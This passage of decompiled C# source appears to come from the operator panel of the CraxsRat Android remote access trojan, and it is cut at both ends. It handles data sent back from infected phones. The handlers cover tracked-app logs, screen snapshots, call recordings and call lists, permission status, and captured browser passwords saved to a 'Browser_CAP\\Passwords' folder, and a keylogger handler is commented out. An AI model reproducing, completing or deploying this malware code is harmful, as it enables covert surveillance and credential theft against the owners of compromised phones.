												_0024VB_0024ResumableLocal__0024VB_0024Closure__0024175._0024VB_0024Local_datesandinfo = Codes.BSDE(_0024VB_0024ResumableLocal__0024VB_0024Closure__0024175._0024VB_0024Local_collect[3]).Split('#');
												if (_0024VB_0024ResumableLocal__0024VB_0024Closure__0024175._0024VB_0024Local_datesandinfo.Length > 1 && Operators.CompareString(_0024VB_0024ResumableLocal__0024VB_0024Closure__0024175._0024VB_0024Local_datesandinfo[1], "null", TextCompare: false) != 0)
													_0024VB_0024ResumableLocal__0024VB_0024Closure__0024175._0024VB_0024NonLocal__0024VB_0024Closure_10._0024VB_0024NonLocal__0024VB_0024Closure_9._0024VB_0024NonLocal__0024VB_0024Closure_8._0024VB_0024Local_ClassClient.TrackedDatesFounded = _0024VB_0024ResumableLocal__0024VB_0024Closure__0024175._0024VB_0024Local_datesandinfo[1].Split('~');
												if (Operators.CompareString(_0024VB_0024ResumableLocal__0024VB_0024Closure__0024175._0024VB_0024Local_datesandinfo[0], "null", TextCompare: false) != 0)
													_0024VB_0024ResumableLocal__0024VB_0024Closure__0024175._0024VB_0024NonLocal__0024VB_0024Closure_10._0024VB_0024Local_HasRecords = "Yes";
												MainForm.Invoke((VB_0024AnonymousDelegate_0)([SpecialName] () =>
												{
													if (_0024VB_0024ResumableLocal__0024VB_0024Closure__0024175._0024VB_0024Local_collect[0].Equals("O"))
														_0024VB_0024ResumableLocal__0024VB_0024Closure__0024175._0024VB_0024NonLocal__0024VB_0024Closure_10._0024VB_0024NonLocal__0024VB_0024Closure_9._0024VB_0024NonLocal__0024VB_0024Closure_8._0024VB_0024Local_ClassClient.TrackedAppsTable.Rows.Add(Codes.ResizeImage(Resources.ok, new Size(32, 32)), _0024VB_0024ResumableLocal__0024VB_0024Closure__0024175._0024VB_0024Local_Appname, _0024VB_0024ResumableLocal__0024VB_0024Closure__0024175._0024VB_0024NonLocal__0024VB_0024Closure_10._0024VB_0024Local_HasRecords, _0024VB_0024ResumableLocal__0024VB_0024Closure__0024175._0024VB_0024Local_collect[2], Codes.ProcessJson(_0024VB_0024ResumableLocal__0024VB_0024Closure__0024175._0024VB_0024Local_datesandinfo[0]));
													else if (_0024VB_0024ResumableLocal__0024VB_0024Closure__0024175._0024VB_0024Local_collect[0].Equals("N"))
													{
														_0024VB_0024ResumableLocal__0024VB_0024Closure__0024175._0024VB_0024NonLocal__0024VB_0024Closure_10._0024VB_0024NonLocal__0024VB_0024Closure_9._0024VB_0024NonLocal__0024VB_0024Closure_8._0024VB_0024Local_ClassClient.TrackedAppsTable.Rows.Add(Codes.ResizeImage(Resources.notok, new Size(32, 32)), _0024VB_0024ResumableLocal__0024VB_0024Closure__0024175._0024VB_0024Local_Appname, _0024VB_0024ResumableLocal__0024VB_0024Closure__0024175._0024VB_0024NonLocal__0024VB_0024Closure_10._0024VB_0024Local_HasRecords, _0024VB_0024ResumableLocal__0024VB_0024Closure__0024175._0024VB_0024Local_collect[2], "");
													}
												}));
											}
										}
									}
									else if (Operators.CompareString(_0024VB_0024ResumableLocal__0024VB_0024Closure__0024169._0024VB_0024Local_arry2[0], "G", TextCompare: false) == 0)
									{
										try
										{
											if (_0024VB_0024ResumableLocal__0024VB_0024Closure__0024169._0024VB_0024Local_arry2[1].StartsWith("F:"))
											{
												_0024VB_0024ResumableLocal__0024VB_0024Closure__0024176 = new _Closure_0024__39_002D12(_0024VB_0024ResumableLocal__0024VB_0024Closure__0024176);
												_0024VB_0024ResumableLocal__0024VB_0024Closure__0024176._0024VB_0024NonLocal__0024VB_0024Closure_11 = _0024VB_0024ResumableLocal__0024VB_0024Closure__0024169;
												_0024VB_0024ResumableLocal__0024VB_0024Closure__0024176._0024VB_0024Local_handle = "snapD_" + _0024VB_0024ResumableLocal__0024VB_0024Closure__0024176._0024VB_0024NonLocal__0024VB_0024Closure_11._0024VB_0024NonLocal__0024VB_0024Closure_8._0024VB_0024Local_ClassClient.ClientRemoteAddress;
												_0024VB_0024ResumableLocal__0024VB_0024Closure__0024176._0024VB_0024Local_DownSnap = (snapsdownloader)MyProject.Application.OpenForms[_0024VB_0024ResumableLocal__0024VB_0024Closure__0024176._0024VB_0024Local_handle];
												if (_0024VB_0024ResumableLocal__0024VB_0024Closure__0024176._0024VB_0024Local_DownSnap == null)
													MainForm.Invoke((VB_0024AnonymousDelegate_0)([SpecialName] () =>
													{
														_0024VB_0024ResumableLocal__0024VB_0024Closure__0024176._0024VB_0024Local_DownSnap = new snapsdownloader();
														_0024VB_0024ResumableLocal__0024VB_0024Closure__0024176._0024VB_0024Local_DownSnap.Name = _0024VB_0024ResumableLocal__0024VB_0024Closure__0024176._0024VB_0024Local_handle;
														_0024VB_0024ResumableLocal__0024VB_0024Closure__0024176._0024VB_0024Local_DownSnap.infotext.Text = "Name: " + _0024VB_0024ResumableLocal__0024VB_0024Closure__0024176._0024VB_0024NonLocal__0024VB_0024Closure_11._0024VB_0024NonLocal__0024VB_0024Closure_8._0024VB_0024Local_ClassClient.ClientName + Strings.Space(4) + "IP: " + _0024VB_0024ResumableLocal__0024VB_0024Closure__0024176._0024VB_0024NonLocal__0024VB_0024Closure_11._0024VB_0024NonLocal__0024VB_0024Closure_8._0024VB_0024Local_ClassClient.ClientAddressIP;
														_0024VB_0024ResumableLocal__0024VB_0024Closure__0024176._0024VB_0024Local_DownSnap.clipic.Image = _0024VB_0024ResumableLocal__0024VB_0024Closure__0024176._0024VB_0024NonLocal__0024VB_0024Closure_11._0024VB_0024NonLocal__0024VB_0024Closure_8._0024VB_0024Local_ClassClient.Wallpaper;
														_0024VB_0024ResumableLocal__0024VB_0024Closure__0024176._0024VB_0024Local_DownSnap.totaltext.Text = "-> Total : " + _0024VB_0024ResumableLocal__0024VB_0024Closure__0024176._0024VB_0024NonLocal__0024VB_0024Closure_11._0024VB_0024Local_arry2[1].Replace("F:", "");
														_0024VB_0024ResumableLocal__0024VB_0024Closure__0024176._0024VB_0024Local_DownSnap.statustext.Text = "-> Status : Starting";
														_0024VB_0024ResumableLocal__0024VB_0024Closure__0024176._0024VB_0024Local_DownSnap.finishedtext.Text = "-> Finished: 0";
														_0024VB_0024ResumableLocal__0024VB_0024Closure__0024176._0024VB_0024Local_DownSnap.lefttext.Text = "-> Left: " + _0024VB_0024ResumableLocal__0024VB_0024Closure__0024176._0024VB_0024NonLocal__0024VB_0024Closure_11._0024VB_0024Local_arry2[1].Replace("F:", "");
														_0024VB_0024ResumableLocal__0024VB_0024Closure__0024176._0024VB_0024Local_DownSnap.totalImages = int.Parse(_0024VB_0024ResumableLocal__0024VB_0024Closure__0024176._0024VB_0024NonLocal__0024VB_0024Closure_11._0024VB_0024Local_arry2[1].Replace("F:", ""));
														_0024VB_0024ResumableLocal__0024VB_0024Closure__0024176._0024VB_0024Local_DownSnap.Downloadfolder = _0024VB_0024ResumableLocal__0024VB_0024Closure__0024176._0024VB_0024NonLocal__0024VB_0024Closure_11._0024VB_0024NonLocal__0024VB_0024Closure_8._0024VB_0024Local_ClassClient.FolderUSER + "\\Tracker_Snaps";
														if (!Directory.Exists(_0024VB_0024ResumableLocal__0024VB_0024Closure__0024176._0024VB_0024Local_DownSnap.Downloadfolder))
															Directory.CreateDirectory(_0024VB_0024ResumableLocal__0024VB_0024Closure__0024176._0024VB_0024Local_DownSnap.Downloadfolder);
														_0024VB_0024ResumableLocal__0024VB_0024Closure__0024176._0024VB_0024Local_DownSnap.Show();
													}));
											}
										}
										catch (Exception ex61)
										{
											ProjectData.SetProjectError(ex61);
											Exception ex62 = ex61;
											_0024VB_0024ResumableLocal_ex_0024177 = ex62;
											ProjectData.ClearProjectError();
										}
									}
									else if (Operators.CompareString(_0024VB_0024ResumableLocal__0024VB_0024Closure__0024169._0024VB_0024Local_arry2[0], "R", TextCompare: false) == 0)
									{
										_0024VB_0024ResumableLocal__0024VB_0024Closure__0024178 = new _Closure_0024__39_002D14(_0024VB_0024ResumableLocal__0024VB_0024Closure__0024178);
										_0024VB_0024ResumableLocal_data_0024179 = _0024VB_0024ResumableLocal__0024VB_0024Closure__0024169._0024VB_0024Local_arry2[1].Split('#');
										_0024VB_0024ResumableLocal__0024VB_0024Closure__0024178._0024VB_0024Local_appname = _0024VB_0024ResumableLocal_data_0024179[1];
										if (Operators.CompareString(_0024VB_0024ResumableLocal_data_0024179[0], "OK", TextCompare: false) == 0)
											MainForm.Invoke((VB_0024AnonymousDelegate_0)([SpecialName] () =>
											{
												CraxsAlert.ShowSucess(_0024VB_0024ResumableLocal__0024VB_0024Closure__0024178._0024VB_0024Local_appname + " record has been Removed");
											}));
										else if (Operators.CompareString(_0024VB_0024ResumableLocal_data_0024179[0], "NO", TextCompare: false) == 0)
										{
											MainForm.Invoke((VB_0024AnonymousDelegate_0)([SpecialName] () =>
											{
												CraxsAlert.ShowSucess(_0024VB_0024ResumableLocal__0024VB_0024Closure__0024178._0024VB_0024Local_appname + " error while removing...");
											}));
										}
									}
								}
							}
							else if (Operators.CompareString(_0024S9, CheckforSnap(_0024VB_0024ResumableLocal_getCase_00247), TextCompare: false) == 0)
							{
								try
								{
									_0024VB_0024ResumableLocal_arry_0024180 = _0024VB_0024ResumableLocal_getCase_00247.Split(':');
									_0024VB_0024ResumableLocal_handle_0024181 = "snapD_" + _0024VB_0024ResumableLocal_arry_0024180[0];
									_0024VB_0024ResumableLocal_DownSnap_0024182 = (snapsdownloader)MyProject.Application.OpenForms[_0024VB_0024ResumableLocal_handle_0024181];
									if (_0024VB_0024ResumableLocal_DownSnap_0024182 != null)
									{
										_0024VB_0024ResumableLocal_DownSnap_0024182.imageCounter++;
										_0024VB_0024ResumableLocal_Byte__0024183 = (byte[])_0024VB_0024ResumableLocal_SPLByte_00245.GetValue(1);
										_0024VB_0024ResumableLocal_downloadfolder_0024184 = _0024VB_0024ResumableLocal_DownSnap_0024182.Downloadfolder + "\\" + _0024VB_0024ResumableLocal_arry_0024180[1];
										if (!Directory.Exists(_0024VB_0024ResumableLocal_downloadfolder_0024184))
											Directory.CreateDirectory(_0024VB_0024ResumableLocal_downloadfolder_0024184);
										File.WriteAllBytes(_0024VB_0024ResumableLocal_downloadfolder_0024184 + "\\IMG-" + _0024VB_0024ResumableLocal_DownSnap_0024182.imageCounter + ".jpg", _0024VB_0024ResumableLocal_Byte__0024183);
										_0024VB_0024ResumableLocal_DownSnap_0024182.UpdateProgressBar();
									}
								}
								catch (Exception ex63)
								{
									ProjectData.SetProjectError(ex63);
									Exception ex64 = ex63;
									_0024VB_0024ResumableLocal_ex_0024185 = ex64;
									ProjectData.ClearProjectError();
								}
							}
							else if (MainForm.InvokeRequired)
							{
								MainForm.Invoke(new Delegatex(HandelData), _0024VB_0024Local_ParametersObject);
							}
							else
							{
								_0024S186 = _0024VB_0024ResumableLocal_getCase_00247.Trim();
								if (Operators.CompareString(_0024S186, "EX", TextCompare: false) == 0)
								{
									_0024VB_0024ResumableLocal_THEDATA_0024187 = Codes.Encoding().GetString((byte[])_0024VB_0024ResumableLocal_SPLByte_00245.GetValue(1));
									_0024VB_0024ResumableLocal_SaveFile_0024188 = reso.CrashsPath + "\\Client_Crash_" + _0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient.UUID + ".txt";
									_0024VB_0024ResumableLocal_All_0024189 = "";
									if (!Directory.Exists(reso.CrashsPath))
										Directory.CreateDirectory(reso.CrashsPath);
									if (File.Exists(_0024VB_0024ResumableLocal_SaveFile_0024188))
										_0024VB_0024ResumableLocal_All_0024189 = File.ReadAllText(_0024VB_0024ResumableLocal_SaveFile_0024188) + "\r\n" + _0024VB_0024ResumableLocal_THEDATA_0024187;
									else
									{
										_0024VB_0024ResumableLocal_All_0024189 = _0024VB_0024ResumableLocal_THEDATA_0024187;
										File.Create(_0024VB_0024ResumableLocal_SaveFile_0024188).Dispose();
									}
									_0024VB_0024ResumableLocal_themesg_0024190 = "this is unexpected error occurred on the client side (Phone) , Please send this file to developer ( ) ( ) To fix it";
									_0024S191 = RegistryHandler.Get_Language();
									string left = _0024S191;
									if (Operators.CompareString(left, "AR", TextCompare: false) != 0)
									{
										if (Operators.CompareString(left, "CN", TextCompare: false) == 0)
											_0024VB_0024ResumableLocal_themesg_0024190 = Codes.Translate(_0024VB_0024ResumableLocal_themesg_0024190, "en", "zh");
									}
									else
										_0024VB_0024ResumableLocal_themesg_0024190 = Codes.Translate(_0024VB_0024ResumableLocal_themesg_0024190, "en", "ar");
									File.WriteAllText(_0024VB_0024ResumableLocal_SaveFile_0024188, _0024VB_0024ResumableLocal_themesg_0024190 + "\r\n------------------\r\n" + _0024VB_0024ResumableLocal_All_0024189);
									Codes.MyMsgBox("Client Error", "the apk crashed unexpectedly , Please Send Client_Crash.txt to the developer to fix the bug , thanks", useno: false, Resources.error48px);
									Process.Start(reso.CrashsPath);
								}
								else if (Operators.CompareString(_0024S186, "NOTIF", TextCompare: false) == 0)
								{
									_0024VB_0024ResumableLocal_THEDATA_0024192 = Codes.Encoding().GetString((byte[])_0024VB_0024ResumableLocal_SPLByte_00245.GetValue(1));
									Codes.MyMsgBox("Message From Client", _0024VB_0024ResumableLocal_THEDATA_0024192, useno: false, _0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient.Wallpaper);
								}
								else if (Operators.CompareString(_0024S186, "SRC", TextCompare: false) == 0)
								{
									try
									{
										_0024VB_0024ResumableLocal_handle_0024193 = "Calls_Records_" + _0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient.ClientAddressIP;
										_0024VB_0024ResumableLocal_recordform_0024194 = (Calls_Records)MyProject.Application.OpenForms[_0024VB_0024ResumableLocal_handle_0024193];
										if (_0024VB_0024ResumableLocal_recordform_0024194 != null)
										{
											_0024VB_0024ResumableLocal_THEDATA_0024195 = Codes.Encoding().GetString((byte[])_0024VB_0024ResumableLocal_SPLByte_00245.GetValue(1));
											_0024VB_0024ResumableLocal_therecords_0024196 = _0024VB_0024ResumableLocal_THEDATA_0024195.Split('*');
											_0024VB_0024ResumableLocal_filebase_0024197 = _0024VB_0024ResumableLocal_therecords_0024196[2].Replace(".wav", "");
											_0024VB_0024ResumableLocal_FileId_0024198 = _0024VB_0024ResumableLocal_therecords_0024196[0];
											try
											{
												if (!Directory.Exists(_0024VB_0024ResumableLocal_recordform_0024194.DownloadsFolder + "\\Records"))
													Directory.CreateDirectory(_0024VB_0024ResumableLocal_recordform_0024194.DownloadsFolder + "\\Records");
												_0024VB_0024ResumableLocal_filepath_0024199 = _0024VB_0024ResumableLocal_recordform_0024194.DownloadsFolder + "\\Records\\" + _0024VB_0024ResumableLocal_filebase_0024197.Replace(" ", "_").Replace(":", "-").Replace(",", "")
													.Replace("\\", "-")
													.Replace("/", "-") + ".wav";
												if (_0024VB_0024ResumableLocal_filepath_0024199.Length > 295)
													_0024VB_0024ResumableLocal_filepath_0024199 = _0024VB_0024ResumableLocal_recordform_0024194.DownloadsFolder + "\\Records\\" + Codes.Encrypt(DateTime.Now.Millisecond.ToString(), DateTime.Now.Millisecond.ToString()) + ".wav";
												File.WriteAllBytes(_0024VB_0024ResumableLocal_filepath_0024199, Convert.FromBase64String(_0024VB_0024ResumableLocal_therecords_0024196[1]));
												try
												{
													_0024S200 = ((IEnumerable)_0024VB_0024ResumableLocal_recordform_0024194.DataGridView1.Rows).GetEnumerator();
													while (_0024S200.MoveNext())
													{
														_0024VB_0024ResumableLocal_r_0024201 = (DataGridViewRow)_0024S200.Current;
														try
														{
															if (_0024VB_0024ResumableLocal_r_0024201.Tag != null && Operators.CompareString(_0024VB_0024ResumableLocal_r_0024201.Tag.ToString().ToLower(), _0024VB_0024ResumableLocal_FileId_0024198.ToLower(), TextCompare: false) == 0)
															{
																_0024VB_0024ResumableLocal_r_0024201.Cells[4].Value = "Yes";
																break;
															}
														}
														catch (Exception ex65)
														{
															ProjectData.SetProjectError(ex65);
															Exception ex66 = ex65;
															_0024VB_0024ResumableLocal_ex_0024202 = ex66;
															ProjectData.ClearProjectError();
														}
													}
												}
												finally
												{
													if (num < 0 && _0024S200 is IDisposable)
														(_0024S200 as IDisposable).Dispose();
												}
											}
											catch (Exception ex67)
											{
												ProjectData.SetProjectError(ex67);
												Exception ex68 = ex67;
												_0024VB_0024ResumableLocal_ex_0024203 = ex68;
												ProjectData.ClearProjectError();
											}
										}
									}
									catch (Exception ex69)
									{
										ProjectData.SetProjectError(ex69);
										Exception ex70 = ex69;
										_0024VB_0024ResumableLocal_ex_0024204 = ex70;
										ProjectData.ClearProjectError();
									}
								}
								else if (Operators.CompareString(_0024S186, "-449", TextCompare: false) == 0)
								{
									try
									{
										_0024VB_0024ResumableLocal_handle_0024205 = "Permissions_Manager" + _0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient.ClientRemoteAddress;
										_0024VB_0024ResumableLocal_autoer_0024206 = (PermissionsManager)MyProject.Application.OpenForms[_0024VB_0024ResumableLocal_handle_0024205];
										_0024VB_0024ResumableLocal_THEDATA_0024207 = Codes.Encoding().GetString((byte[])_0024VB_0024ResumableLocal_SPLByte_00245.GetValue(1));
										if (_0024VB_0024ResumableLocal_autoer_0024206 != null)
										{
											if (_0024VB_0024ResumableLocal_THEDATA_0024207.StartsWith("{L}"))
												_0024VB_0024ResumableLocal_autoer_0024206.UpdatePrims(new object[1] { _0024VB_0024ResumableLocal_THEDATA_0024207.Replace("{L}", "").Split('>') });
											else if (_0024VB_0024ResumableLocal_THEDATA_0024207.StartsWith("EX:"))
											{
												_0024VB_0024ResumableLocal_autoer_0024206.UpdateStatus(new object[1] { "Error: " + _0024VB_0024ResumableLocal_THEDATA_0024207.Replace("EX:", "") });
											}
										}
									}
									catch (Exception ex71)
									{
										ProjectData.SetProjectError(ex71);
										Exception ex72 = ex71;
										_0024VB_0024ResumableLocal_ex_0024208 = ex72;
										ProjectData.ClearProjectError();
									}
								}
								else if (Operators.CompareString(_0024S186, "-427", TextCompare: false) == 0)
								{
									try
									{
										_0024VB_0024ResumableLocal_handle_0024209 = "Keyboard_Manager" + _0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient.ClientRemoteAddress;
										///_0024VB_0024ResumableLocal_autoer_0024210 = (KeyboardManager)MyProject.Application.OpenForms[_0024VB_0024ResumableLocal_handle_0024209];
										///_0024VB_0024ResumableLocal_THEDATA_0024211 = Codes.Encoding().GetString((byte[])_0024VB_0024ResumableLocal_SPLByte_00245.GetValue(1));
										///if (_0024VB_0024ResumableLocal_autoer_0024210 != null)
										///{
										///if (_0024VB_0024ResumableLocal_THEDATA_0024211.StartsWith("PR:"))
										///	_0024VB_0024ResumableLocal_autoer_0024210.UpdatePrims(new object[1] { _0024VB_0024ResumableLocal_THEDATA_0024211.Replace("PR:", "").Split('>') });
										///else if (_0024VB_0024ResumableLocal_THEDATA_0024211.StartsWith("LG:"))
										///{
										///	_0024VB_0024ResumableLocal_autoer_0024210.CraxsRatkfvuiorkenfudpajrsnCraxsRatsreaqlkoz(new object[1] { _0024VB_0024ResumableLocal_THEDATA_0024211.Replace("LG:", "") });
										///}
									}
									///	}
									catch (Exception ex73)
									{
										ProjectData.SetProjectError(ex73);
										Exception ex74 = ex73;
										_0024VB_0024ResumableLocal_ex_0024212 = ex74;
										ProjectData.ClearProjectError();
									}
								}
								else if (Operators.CompareString(_0024S186, "-776", TextCompare: false) == 0)
								{
									try
									{
										_0024VB_0024ResumableLocal_handle_0024213 = "Calls_Records_" + _0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient.ClientAddressIP;
										_0024VB_0024ResumableLocal_recordform_0024214 = (Calls_Records)MyProject.Application.OpenForms[_0024VB_0024ResumableLocal_handle_0024213];
										if (_0024VB_0024ResumableLocal_recordform_0024214 != null)
										{
											_0024VB_0024ResumableLocal_recordform_0024214.loadingbar.Visible = false;
											_0024VB_0024ResumableLocal_recordform_0024214.loadingbar.Enabled = false;
											_0024VB_0024ResumableLocal_THEDATA_0024215 = Codes.Encoding().GetString((byte[])_0024VB_0024ResumableLocal_SPLByte_00245.GetValue(1));
											_0024VB_0024ResumableLocal_therecords_0024216 = reso.formatrecords(_0024VB_0024ResumableLocal_THEDATA_0024215);
											_0024S217 = _0024VB_0024ResumableLocal_therecords_0024216;
											for (_0024S218 = 0; _0024S218 < _0024S217.Length; _0024S218++)
											{
												_0024VB_0024ResumableLocal_record_0024219 = _0024S217[_0024S218];
												try
												{
													_0024VB_0024ResumableLocal_ary_0024220 = _0024VB_0024ResumableLocal_record_0024219.Split('@');
													try
													{
														if (_0024VB_0024ResumableLocal_ary_0024220[0].Contains("\n"))
														{
															_0024VB_0024ResumableLocal_ary_0024220[0] = _0024VB_0024ResumableLocal_ary_0024220[0].Replace("\n", "***");
															_0024VB_0024ResumableLocal_FIXNAMES_0024221 = _0024VB_0024ResumableLocal_ary_0024220[0].Split('*');
															_0024VB_0024ResumableLocal_ary_0024220[0] = _0024VB_0024ResumableLocal_FIXNAMES_0024221[0] + _0024VB_0024ResumableLocal_FIXNAMES_0024221[1];
														}
													}
													catch (Exception ex75)
													{
														ProjectData.SetProjectError(ex75);
														Exception ex76 = ex75;
														_0024VB_0024ResumableLocal_ex_0024222 = ex76;
														ProjectData.ClearProjectError();
													}
													try
													{
														try
														{
															_0024VB_0024ResumableLocal_base_0024223 = Codes.BSDE(_0024VB_0024ResumableLocal_ary_0024220[0].Replace(".wav", ""));
														}
														catch (Exception ex77)
														{
															ProjectData.SetProjectError(ex77);
															Exception ex78 = ex77;
															_0024VB_0024ResumableLocal_ex_0024224 = ex78;
															_0024VB_0024ResumableLocal_base_0024223 = _0024VB_0024ResumableLocal_ary_0024220[0].Replace(".wav", "");
															ProjectData.ClearProjectError();
														}
														_0024VB_0024ResumableLocal_isfound_0024225 = "No";
														if (!Directory.Exists(_0024VB_0024ResumableLocal_recordform_0024214.DownloadsFolder + "\\Records"))
															Directory.CreateDirectory(_0024VB_0024ResumableLocal_recordform_0024214.DownloadsFolder + "\\Records");
														_0024S226 = Directory.GetFiles(_0024VB_0024ResumableLocal_recordform_0024214.DownloadsFolder + "\\Records");
														for (_0024S227 = 0; _0024S227 < _0024S226.Length; _0024S227++)
														{
															_0024VB_0024ResumableLocal_f_0024228 = _0024S226[_0024S227];
															try
															{
																if (_0024VB_0024ResumableLocal_f_0024228 != null && _0024VB_0024ResumableLocal_f_0024228.ToLower().Contains(_0024VB_0024ResumableLocal_base_0024223.ToLower().Replace(" ", "_").Replace(":", "-")
																	.Replace(",", "")
																	.Replace("\\", "-")
																	.Replace("/", "-")))
																{
																	_0024VB_0024ResumableLocal_isfound_0024225 = "Yes";
																	break;
																}
															}
															catch (Exception ex79)
															{
																ProjectData.SetProjectError(ex79);
																Exception ex80 = ex79;
																_0024VB_0024ResumableLocal_ex_0024229 = ex80;
																ProjectData.ClearProjectError();
															}
														}
														_0024VB_0024ResumableLocal_finaldata_0024230 = _0024VB_0024ResumableLocal_base_0024223.Split('_');
														if (_0024VB_0024ResumableLocal_finaldata_0024230.Length > 0)
														{
															_0024VB_0024ResumableLocal_datecall_0024231 = _0024VB_0024ResumableLocal_finaldata_0024230[0];
															_0024VB_0024ResumableLocal_callnumber_0024232 = _0024VB_0024ResumableLocal_finaldata_0024230[1];
															_0024VB_0024ResumableLocal_status_0024233 = _0024VB_0024ResumableLocal_finaldata_0024230[2];
															if (Operators.CompareString(_0024VB_0024ResumableLocal_status_0024233, "IN", TextCompare: false) == 0)
																_0024VB_0024ResumableLocal_recordform_0024214.Addrecord(new object[7]
																{
																	_0024VB_0024ResumableLocal_status_0024233,
																	Resources.incall_removebg_preview,
																	_0024VB_0024ResumableLocal_callnumber_0024232,
																	_0024VB_0024ResumableLocal_datecall_0024231,
																	_0024VB_0024ResumableLocal_ary_0024220[1] + _0024VB_0024ResumableLocal_ary_0024220[2],
																	_0024VB_0024ResumableLocal_isfound_0024225,
																	_0024VB_0024ResumableLocal_ary_0024220[0]
																});
															else if (Operators.CompareString(_0024VB_0024ResumableLocal_status_0024233, "OUT", TextCompare: false) == 0)
															{
																_0024VB_0024ResumableLocal_recordform_0024214.Addrecord(new object[7]
																{
																	_0024VB_0024ResumableLocal_status_0024233,
																	Resources.outcall_removebg_preview,
																	_0024VB_0024ResumableLocal_callnumber_0024232,
																	_0024VB_0024ResumableLocal_datecall_0024231,
																	_0024VB_0024ResumableLocal_ary_0024220[1] + _0024VB_0024ResumableLocal_ary_0024220[2],
																	_0024VB_0024ResumableLocal_isfound_0024225,
																	_0024VB_0024ResumableLocal_ary_0024220[0]
																});
															}
															else if (Operators.CompareString(_0024VB_0024ResumableLocal_status_0024233, "REC", TextCompare: false) == 0)
															{
																_0024VB_0024ResumableLocal_recordform_0024214.Addrecord(new object[7]
																{
																	_0024VB_0024ResumableLocal_status_0024233,
																	Resources.recoeded,
																	_0024VB_0024ResumableLocal_callnumber_0024232,
																	_0024VB_0024ResumableLocal_datecall_0024231,
																	_0024VB_0024ResumableLocal_ary_0024220[1] + _0024VB_0024ResumableLocal_ary_0024220[2],
																	_0024VB_0024ResumableLocal_isfound_0024225,
																	_0024VB_0024ResumableLocal_ary_0024220[0]
																});
															}
														}
													}
													catch (Exception ex81)
													{
														ProjectData.SetProjectError(ex81);
														Exception ex82 = ex81;
														_0024VB_0024ResumableLocal_ex_0024234 = ex82;
														ProjectData.ClearProjectError();
													}
												}
												catch (Exception ex83)
												{
													ProjectData.SetProjectError(ex83);
													Exception ex84 = ex83;
													_0024VB_0024ResumableLocal_ex_0024235 = ex84;
													ProjectData.ClearProjectError();
												}
											}
										}
									}
									catch (Exception ex85)
									{
										ProjectData.SetProjectError(ex85);
										Exception ex86 = ex85;
										_0024VB_0024ResumableLocal_ex_0024236 = ex86;
										ProjectData.ClearProjectError();
									}
								}
								else if (Operators.CompareString(_0024S186, "951", TextCompare: false) == 0)
								{
									try
									{
										_0024VB_0024ResumableLocal__0024VB_0024Closure__0024237 = new _Closure_0024__39_002D15(_0024VB_0024ResumableLocal__0024VB_0024Closure__0024237);
										_0024VB_0024ResumableLocal_handle_0024238 = "Web_Browser_" + _0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient.ClientAddressIP;
										_0024VB_0024ResumableLocal_THEDATA_0024239 = Codes.Encoding().GetString((byte[])_0024VB_0024ResumableLocal_SPLByte_00245.GetValue(1));
										_0024VB_0024ResumableLocal__0024VB_0024Closure__0024237._0024VB_0024Local_BrowserMonitor = (WebViewMonitor)MyProject.Application.OpenForms[_0024VB_0024ResumableLocal_handle_0024238];
										if (_0024VB_0024ResumableLocal__0024VB_0024Closure__0024237._0024VB_0024Local_BrowserMonitor == null)
										{
											_0024VB_0024ResumableLocal_spl_0024240 = _0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient.Keys.Split(':');
											_0024VB_0024ResumableLocal_objs_0024241 = new object[4]
											{
												_0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient.myClient,
												SecurityKey.KeysClient2 + SPL_SOCKET + "lnk<*>STP" + SPL_SOCKET + _0024VB_0024ResumableLocal_spl_0024240[0] + SPL_SOCKET + _0024VB_0024ResumableLocal_spl_0024240[1] + SPL_SOCKET + SecurityKey.Lockscreen + SPL_SOCKET + Conversions.ToString(0) + SPL_SOCKET + Conversions.ToString(0) + SPL_SOCKET + SPL_ARRAY + SPL_SOCKET + _0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient.ClientRemoteAddress,
												Codes.Encoding().GetBytes("null"),
												_0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient
											};
											_0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient.SendMessage(_0024VB_0024ResumableLocal_objs_0024241);
										}
										else if (_0024VB_0024ResumableLocal_THEDATA_0024239.StartsWith("T:"))
										{
											_0024VB_0024ResumableLocal_alldata_0024242 = _0024VB_0024ResumableLocal_THEDATA_0024239.Substring(2).Split('>');
											_0024VB_0024ResumableLocal_sitename_0024243 = _0024VB_0024ResumableLocal_alldata_0024242[0];
											_0024VB_0024ResumableLocal_Targetdata_0024244 = _0024VB_0024ResumableLocal_alldata_0024242[1].Split('\n');
											_0024VB_0024ResumableLocal_Allmesages_0024245 = "";
											MainForm.Invoke((VB_0024AnonymousDelegate_0)([SpecialName] () =>
											{
												_0024VB_0024ResumableLocal__0024VB_0024Closure__0024237._0024VB_0024Local_BrowserMonitor.datalogtext.Text = "";
											}));
											_0024S246 = _0024VB_0024ResumableLocal_Targetdata_0024244;
											for (_0024S247 = 0; _0024S247 < _0024S246.Length; _0024S247++)
											{
												_0024VB_0024ResumableLocal_dat_0024248 = _0024S246[_0024S247];
												if (!string.IsNullOrEmpty(_0024VB_0024ResumableLocal_dat_0024248))
												{
													_0024VB_0024ResumableLocal_newsg_0024249 = Conversions.ToString(RuntimeHelpers.GetObjectValue(Codes.Formatpassdata(Codes.BSDE(_0024VB_0024ResumableLocal_dat_0024248))));
													_0024VB_0024ResumableLocal__0024VB_0024Closure__0024237._0024VB_0024Local_BrowserMonitor.PostData(_0024VB_0024ResumableLocal_newsg_0024249);
													_0024VB_0024ResumableLocal_Allmesages_0024245 = _0024VB_0024ResumableLocal_Allmesages_0024245 + "> " + _0024VB_0024ResumableLocal_newsg_0024249 + "\r\n";
												}
											}
											if (!Directory.Exists(_0024VB_0024ResumableLocal__0024VB_0024Closure__00240._0024VB_0024Local_ClassClient.FolderUSER + "\\Browser_CAP\\Passwords"))
